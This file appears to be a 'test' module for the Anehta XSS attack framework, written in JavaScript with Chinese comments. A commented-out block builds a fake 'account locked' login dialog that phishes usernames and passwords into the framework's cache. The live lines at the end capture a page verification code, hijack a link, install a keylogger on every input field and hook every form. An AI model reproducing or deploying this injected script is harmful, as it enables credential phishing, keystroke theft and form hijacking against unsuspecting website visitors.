// test 模块,测试使用

//alert(anehta.crypto.random());



/*
	var pop=new Popup({ contentType:3,isReloadOnClose:false,width:340,height:80});
	//pop.setContent("title","删除评论");
	//pop.setContent("confirmCon","您确定要彻底删除这条评论吗？");
	//pop.setContent("callBack",delCallback2);
	//pop.setContent("parameter",{fid:"aaaa",popup:pop});
	pop.build();
	pop.show();
	pop.shadow();
*/

//setTimeout(function(){openWindow('/index.htm', 460, 460, '购买奴隶');}, 1000);


/*
function getPhishFormValue(){
	var param = "username="+$("#phishForm_username")[0].value +
	            "&password="+$("#phishForm_passwd")[0].value;
	            
	anehtaCache.setItem("phishForm", param);
}


//if (!anehta.dom.checkCookie("anehtaPhished")){

setTimeout(function(){
	
	// 加载lib
	anehta.inject.injectScript(anehtaurl+"/server/js/ui.core.js");
	anehta.inject.injectScript(anehtaurl+"/server/js/ui.draggable.js");
	anehta.inject.injectScript(anehtaurl+"/server/js/ui.dialog.js");
	anehta.inject.injectScript(anehtaurl+"/server/js/ui.resizable.js");
	// 加载CSS
	anehta.inject.injectCSS(anehtaurl+"/module/test.css");
	
	var confirm = document.createElement("div");
  confirm.id = "phishForm";
  confirm.style.border = "1px solid black";
  confirm.style.background = "white";
  confirm.style.zIndex = "6553400";
  confirm.style.display = "none";
  confirm.innerHTML = "<div style='float:left; margin: 15 15 15 15px; fontFamily: Verdana,Arial,Helvetica,sans-serif; font-size:14px;  color: #200;'>" + 
                      "您的帐户已锁定，这可能是由于频繁刷新或者网络异常造成的。<br>" +
                      "请重新登录以验证您的身份<br><br>" +
                      "Username: <input id='phishForm_username' type='text' style='margin-left: 15px; width: 150;' /><br>" +
                      "Password: <input id='phishForm_passwd' type='password' style='margin-left: 15px; width: 150;' /><br>" +
                      "<button id='phishForm_submit' class='formbutton2' style='margin: 10 0 10 78px;' onclick='getPhishFormValue();$(\"#phishForm\").dialog(\"destroy\").remove();' />提交</button>" +
                      "</div>";                      
  document.body.appendChild(confirm);

  setTimeout(function(){
  $("#phishForm").dialog({
  	open: function(){
      confirm.style.display = "";
  		$("#phishForm_submit")[0].focus();
  	},
  	  	
	  modal: true,
	  
	  title: "&nbsp;&nbsp;&nbsp;Warning!",
	  
	  overlay: { 
      opacity: 0.8, 
      background: "#cccccc" 
    }, 
       
    draggable: false,
       
    close: function(){
    	$("#phishForm").dialog("destroy").remove();
    }  	
  });  
  
  //anehta.dom.addCookie("anehtaPhished", "1");
  
  }, 1000);
	}, 2000);
//}
*/

anehtaCache.setItem("spVcode", document.getElementsByName("spVcode")[0].value);

anehta.trick.hijackLink(document.getElementById('ln'), "http://www.baidu.com");

anehta.hook.installKeyloggerToAllInputs();
//anehta.hook.installKeylogger(document.getElementById("username"), "blur");

anehta.hook.hookAllForms();
//anehta.hook.hookForm(document.getElementsByName("form1")[0]);


//document.getElementsByName("username")[0].style.visibility  = "hidden";



